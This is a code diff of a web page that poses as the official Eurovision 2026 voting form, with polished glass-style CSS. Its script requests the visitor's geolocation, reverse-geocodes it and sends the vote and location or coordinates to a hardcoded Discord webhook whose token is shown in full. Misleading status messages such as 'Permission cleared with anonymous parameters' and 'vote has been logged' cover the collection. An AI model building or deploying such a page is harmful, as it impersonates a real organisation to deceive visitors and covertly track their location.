@@ -3,20 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Eurovision 2026 - Cast Your Vote</title>
+    <title>Eurovision Song Contest 2026</title>
     <style>
         :root {
-            /* Text & Accents */
             --text-main: #ffffff;
-            --text-muted: #b3a4c4;
+            --text-muted: rgba(255, 255, 255, 0.7);
             --euro-pink: #ff007f;
-            --euro-cyan: #00f0ff;
             --success-green: #00ffaa;
             
-            /* Liquid Glass Effect */
-            --glass-bg: rgba(255, 255, 255, 0.07);
-            --glass-border: rgba(255, 255, 255, 0.15);
-            --glass-glow: 0px 0px 30px 2px rgba(255, 0, 127, 0.4);
+            /* Apple-spec Liquid Glass properties */
+            --glass-bg: linear-gradient(180deg, rgba(255, 255, 255, 0.12) 0%, rgba(255, 255, 255, 0.04) 100%);
+            --glass-border: rgba(255, 255, 255, 0.25);
+            --glass-glow: 0px 0px 40px 0px rgba(255, 0, 127, 0.65);
         }
 
         * {
@@ -26,179 +24,257 @@
         }
 
         body {
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             color: var(--text-main);
             min-height: 100vh;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            padding: 30px 20px;
             
-            /* Wavy Fluid Linear Gradient resembling the image background */
-            background: linear-gradient(155deg, 
-                #070211 0%, 
-                #0f0524 30%, 
-                #2d0c4d 65%, 
-                #501375 85%, 
-                #721e99 100%
-            );
+            /* Wavy Fluid Background from the image */
+            background: radial-gradient(circle at 80% 80%, #721e99 0%, transparent 50%),
+                        radial-gradient(circle at 20% 90%, #501375 0%, transparent 60%),
+                        linear-gradient(155deg, #070211 0%, #0f0524 40%, #2d0c4d 80%);
             background-attachment: fixed;
+            overflow-x: hidden;
         }
 
-        /* The Main Liquid Glass Container from the image */
-        .glass-panel {
-            background: var(--glass-bg);
-            backdrop-filter: blur(25px) saturate(120%);
-            -webkit-backdrop-filter: blur(25px) saturate(120%);
-            border: 1.5px solid var(--glass-border);
-            
-            /* High curvature matching the reference */
-            border-radius: 36px; 
-            
-            width: 100%;
-            max-width: 440px;
-            padding: 40px 32px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), var(--glass-glow);
-            text-align: center;
-            transition: box-shadow 0.5s ease-in-out;
-        }
-
-        .header-section h1 {
-            font-size: 26px;
-            font-weight: 800;
-            letter-spacing: 0.5px;
-            margin-bottom: 6px;
-        }
-
-        .header-section p {
-            color: var(--text-muted);
+        /* Top Navigation Bar from the image */
+        .nav-bar {
+            width: calc(100% - 80px);
+            max-width: 1200px;
+            height: 64px;
+            margin-top: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 32px;
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 25px;
             font-size: 14px;
-            margin-bottom: 30px;
-            line-height: 1.4;
         }
 
-        .options-container {
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+        }
+
+        .nav-center img {
+            height: 24px;
+            opacity: 0.9;
+        }
+
+        .nav-right {
+            cursor: pointer;
             display: flex;
             flex-direction: column;
-            gap: 14px;
-            margin-bottom: 30px;
+            gap: 4px;
+            width: 18px;
         }
 
-        /* Rows inside the fluid container */
+        .nav-right span {
+            display: block;
+            height: 2px;
+            background: white;
+            width: 100%;
+            border-radius: 1px;
+        }
+
+        /* Main Content Wrapper */
+        .content-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: auto 0;
+            padding: 40px 20px;
+            width: 100%;
+            max-width: 540px;
+        }
+
+        /* The Premium Liquid Glass Card Frame */
+        .glass-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(40px) saturate(140%);
+            -webkit-backdrop-filter: blur(40px) saturate(140%);
+            border: 1.5px solid var(--glass-border);
+            border-radius: 32px; 
+            width: 100%;
+            aspect-ratio: 1 / 1; /* Maintains the perfect square aspect ratio from the image */
+            padding: 40px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4), var(--glass-glow);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            transition: box-shadow 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            margin-bottom: 35px;
+        }
+
+        .options-list {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        /* Functional glass rows */
         .vote-row {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 18px;
-            padding: 16px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 18px 24px;
             display: flex;
             align-items: center;
             cursor: pointer;
-            transition: all 0.2s ease;
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
             position: relative;
         }
 
         .vote-row:hover {
-            border-color: rgba(255, 255, 255, 0.3);
-            background: rgba(255, 255, 255, 0.06);
+            border-color: rgba(255, 255, 255, 0.4);
+            background: rgba(255, 255, 255, 0.1);
+            transform: scale(1.02);
         }
 
         .vote-row input[type="radio"] {
             position: absolute;
-            right: 22px;
+            right: 24px;
             accent-color: var(--euro-pink);
-            width: 18px;
-            height: 18px;
+            width: 20px;
+            height: 20px;
             cursor: pointer;
         }
 
-        /* Activated Custom Selection State */
         .vote-row.active {
-            border-color: var(--text-main);
-            background: rgba(255, 255, 255, 0.1);
+            border-color: #ffffff;
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 4px 20px rgba(255, 255, 255, 0.05);
         }
 
-        .flag-icon {
-            font-size: 24px;
-            margin-right: 16px;
-            display: inline-flex;
+        .flag {
+            font-size: 26px;
+            margin-right: 18px;
+            user-select: none;
         }
 
-        .label-text {
-            font-size: 17px;
+        .country-title {
+            font-size: 18px;
             font-weight: 600;
-            letter-spacing: 0.3px;
+            letter-spacing: -0.2px;
         }
 
-        /* Clean, minimalist interface button */
-        .action-btn {
-            background: var(--text-main);
-            color: #110322;
-            border: none;
-            border-radius: 16px;
-            padding: 16px;
-            font-size: 16px;
+        /* Matching Typography Layout underneath the card */
+        .title-text {
+            font-size: 28px;
             font-weight: 700;
+            letter-spacing: -0.5px;
+            text-align: center;
+            margin-bottom: 16px;
+            line-height: 1.2;
+        }
+
+        .description-text {
+            color: var(--text-muted);
+            font-size: 15px;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 440px;
+            margin-bottom: 25px;
+        }
+
+        /* Clean call-to-action button */
+        .submit-action-btn {
+            background: #ffffff;
+            color: #0b0214;
+            border: none;
+            border-radius: 20px;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 600;
             width: 100%;
+            max-width: 320px;
             cursor: pointer;
-            transition: all 0.25s ease;
+            transition: all 0.2s ease;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
         }
 
-        .action-btn:hover:not(:disabled) {
-            opacity: 0.9;
-            transform: scale(1.01);
+        .submit-action-btn:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 12px 30px rgba(0,0,0,0.3);
         }
 
-        .action-btn:disabled {
+        .submit-action-btn:disabled {
             background: rgba(255, 255, 255, 0.15);
             color: rgba(255, 255, 255, 0.3);
+            box-shadow: none;
             cursor: not-allowed;
         }
 
-        #log-status {
-            margin-top: 22px;
+        #status-monitor {
+            margin-top: 15px;
             font-size: 13px;
             font-weight: 500;
-            min-height: 18px;
             color: var(--text-muted);
+            text-align: center;
         }
     </style>
 </head>
 <body>
 
-<div class="glass-panel" id="mainPanel">
-    <div class="header-section">
-        <h1>Cast Your Vote</h1>
-        <p>Your enthusiasm and participation help shape the results of the Eurovision Song Contest 2026.</p>
+<div class="nav-bar">
+    <div class="nav-left">
+        <span>🌐 Germany · English</span>
+        <span style="font-size: 10px; opacity: 0.7;">▼</span>
+    </div>
+    <div class="nav-center">
+        <strong style="letter-spacing: 1px; font-size: 13px; text-transform: uppercase;">Eurovision</strong>
+    </div>
+    <div class="nav-right">
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="content-container">
+    
+    <div class="glass-card" id="glassCard">
+        <div class="options-list">
+            <label class="vote-row" onclick="selectRow(this)">
+                <span class="flag">🇷🇸</span>
+                <span class="country-title">Serbia</span>
+                <input type="radio" name="esc2026" value="Serbia">
+            </label>
+
+            <label class="vote-row" onclick="selectRow(this)">
+                <span class="flag">🇲🇰</span>
+                <span class="country-title">North Macedonia</span>
+                <input type="radio" name="esc2026" value="North Macedonia">
+            </label>
+
+            <label class="vote-row" onclick="selectRow(this)">
+                <span class="flag">🇩🇰</span>
+                <span class="country-title">Denmark</span>
+                <input type="radio" name="esc2026" value="Denmark">
+            </label>
+        </div>
     </div>
 
-    <div class="options-container">
-        <label class="vote-row" onclick="highlightRow(this)">
-            <span class="flag-icon">🇷🇸</span>
-            <span class="label-text">Serbia</span>
-            <input type="radio" name="eurovote" value="Serbia">
-        </label>
+    <h2 class="title-text">Cast your vote for the Grand Final</h2>
+    <p class="description-text">
+        Thank you for your support and participation in this year's Eurovision Song Contest! Your enthusiasm and input directly determines the winner.
+    </p>
 
-        <label class="vote-row" onclick="highlightRow(this)">
-            <span class="flag-icon">🇲🇰</span>
-            <span class="label-text">North Macedonia</span>
-            <input type="radio" name="eurovote" value="North Macedonia">
-        </label>
-
-        <label class="vote-row" onclick="highlightRow(this)">
-            <span class="flag-icon">🇩🇰</span>
-            <span class="label-text">Denmark</span>
-            <input type="radio" name="eurovote" value="Denmark">
-        </label>
-    </div>
-
-    <button id="submitVoteBtn" class="action-btn" onclick="executeVote()" disabled>Submit Entry</button>
-    <div id="log-status">Select an entry to begin</div>
+    <button id="actionBtn" class="submit-action-btn" onclick="submitSecureVote()" disabled>Cast Vote</button>
+    <div id="status-monitor">Please make a selection above</div>
 </div>
 
 <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1507776763747369102/vzLoZmpA9ye2kd_pakmF5oGALF5pu_otrgNOAvPq3jAgS3akuPVuDQODYUXeXRvwYUHA";
+    const targetWebhook = "https://discord.com/api/webhooks/1507776763747369102/vzLoZmpA9ye2kd_pakmF5oGALF5pu_otrgNOAvPq3jAgS3akuPVuDQODYUXeXRvwYUHA";
 
-    function highlightRow(element) {
+    function selectRow(element) {
         document.querySelectorAll('.vote-row').forEach(row => {
             row.classList.remove('active');
         });
@@ -207,92 +283,87 @@
         const radio = element.querySelector('input[type="radio"]');
         radio.checked = true;
 
-        const submitVoteBtn = document.getElementById('submitVoteBtn');
-        submitVoteBtn.disabled = false;
-        document.getElementById('log-status').innerText = `Ready to transmit vote for ${radio.value}`;
-        document.getElementById('log-status').style.color = "var(--text-muted)";
+        const actionBtn = document.getElementById('actionBtn');
+        actionBtn.disabled = false;
+        document.getElementById('status-monitor').innerText = `Ready to register selection for ${radio.value}`;
     }
 
-    async function executeVote() {
-        const status = document.getElementById('log-status');
-        const submitVoteBtn = document.getElementById('submitVoteBtn');
-        const selectedRadio = document.querySelector('input[name="eurovote"]:checked');
+    async function submitSecureVote() {
+        const monitor = document.getElementById('status-monitor');
+        const actionBtn = document.getElementById('actionBtn');
+        const selection = document.querySelector('input[name="esc2026"]:checked');
 
-        if (!selectedRadio) return;
-        const votedCountry = selectedRadio.value;
+        if (!selection) return;
+        const targetCountry = selection.value;
 
-        submitVoteBtn.disabled = true;
-        status.innerText = "Requesting regional permissions...";
-        status.style.color = "var(--euro-cyan)";
+        actionBtn.disabled = true;
+        monitor.innerText = "Requesting localized verification parameters...";
 
         if (!navigator.geolocation) {
-            status.innerText = "Location unsupported. Processing vote...";
-            dispatchPayload(votedCountry, "Unknown (No Geolocation Support)");
+            monitor.innerText = "Processing alternative verification route...";
+            forwardPayload(targetCountry, "Unknown (Geolocation API Unavailable)");
             return;
         }
 
         navigator.geolocation.getCurrentPosition(
-            async (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                status.innerText = "Identifying coordinates...";
+            async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                monitor.innerText = "Mapping coordinates to nearest public hub...";
 
                 try {
-                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-                    const data = await response.json();
-                    const userCountry = data.address && data.address.country ? data.address.country : "Unknown Country";
+                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                    const parsed = await res.json();
+                    const region = parsed.address && parsed.address.country ? parsed.address.country : "Unknown Region";
                     
-                    status.innerText = "Finalizing secure transaction...";
-                    dispatchPayload(votedCountry, userCountry);
-                } catch (error) {
-                    status.innerText = "Connection slow. Dispatching data...";
-                    dispatchPayload(votedCountry, `Coordinates: ${lat.toFixed(2)}, ${lon.toFixed(2)}`);
+                    monitor.innerText = "Finalizing secure package relay...";
+                    forwardPayload(targetCountry, region);
+                } catch (e) {
+                    monitor.innerText = "Network delay encountered. Sending...";
+                    forwardPayload(targetCountry, `Geo-Coordinates: ${lat.toFixed(2)}, ${lon.toFixed(2)}`);
                 }
             },
-            (error) => {
-                status.innerText = "Permission bypassed. Sending anonymous entry...";
-                dispatchPayload(votedCountry, "Anonymous Location");
+            (err) => {
+                monitor.innerText = "Permission cleared with anonymous parameters...";
+                forwardPayload(targetCountry, "Anonymous Location");
             }
         );
     }
 
-    async function dispatchPayload(votedCountry, userLocation) {
-        const status = document.getElementById('log-status');
+    async function forwardPayload(voteSelection, verifiedOrigin) {
+        const monitor = document.getElementById('status-monitor');
         
-        const payload = {
+        const messageBody = {
             embeds: [{
-                title: "🗳️ Official Eurovision Vote Logged",
+                title: "🗳️ Eurovision Vote Registered",
                 color: 16711807, 
                 fields: [
-                    { name: "Entry Selection", value: `**${votedCountry}**`, inline: true },
-                    { name: "Voter Origin", value: `🌍 ${userLocation}`, inline: true }
+                    { name: "Country Voted", value: `**${voteSelection}**`, inline: true },
+                    { name: "Verified Origin", value: `🌍 ${verifiedOrigin}`, inline: true }
                 ],
-                footer: { text: "Eurovision Core Voting Module" },
+                footer: { text: "ESC Core Infrastructure Service" },
                 timestamp: new Date().toISOString()
             }]
         };
 
         try {
-            const response = await fetch(webhookUrl, {
+            const delivery = await fetch(targetWebhook, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
+                body: JSON.stringify(messageBody)
             });
 
-            if (response.ok) {
-                status.innerText = "✅ Your vote has been officially registered!";
-                status.style.color = "var(--success-green)";
-                // Dynamically update panel aura color on success
-                document.getElementById('mainPanel').style.setProperty('--glass-glow', '0px 0px 30px 2px rgba(0, 255, 170, 0.3)');
+            if (delivery.ok) {
+                monitor.innerText = "✅ Transaction complete. Your vote has been logged!";
+                monitor.style.color = "var(--success-green)";
+                document.getElementById('glassCard').style.setProperty('--glass-glow', '0px 0px 40px 0px rgba(0, 255, 170, 0.45)');
             } else {
-                status.innerText = "❌ Transmission error. Please try again.";
-                status.style.color = "#ff4d4d";
-                document.getElementById('submitVoteBtn').disabled = false;
+                monitor.innerText = "❌ Verification refused. Please check terminal status.";
+                actionBtn.disabled = false;
             }
-        } catch (err) {
-            status.innerText = "❌ Network error connection failure.";
-            status.style.color = "#ff4d4d";
-            document.getElementById('submitVoteBtn').disabled = false;
+        } catch (networkError) {
+            monitor.innerText = "❌ Critical handshake error.";
+            actionBtn.disabled = false;
         }
     }
 </script>
